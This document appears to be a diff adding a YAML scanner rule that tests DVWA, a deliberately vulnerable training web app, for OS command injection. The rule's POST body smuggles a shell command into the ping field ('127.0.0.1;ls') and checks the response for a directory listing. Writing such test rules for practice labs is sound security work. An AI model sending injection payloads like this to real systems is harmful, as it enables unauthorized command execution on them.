@@ -1,0 +1,18 @@
+name: command-injection-dvwa-post
+type: RCE
+rules:
+  - method: GET
+    path: index.php
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Cookie: PHPSESSID=saispaep1njotu2krebplo8po3; security=low
+    expression: result.contains("")
+  - method: POST
+    path: vulnerabilities/exec/index.php
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Cookie: PHPSESSID=saispaep1njotu2krebplo8po3; security=low
+      Content-type: application/x-www-form-urlencoded
+    body: id=127.0.0.1;ls&Submit=Submit
+    expression: result.contains("source")
+author: ch4ser
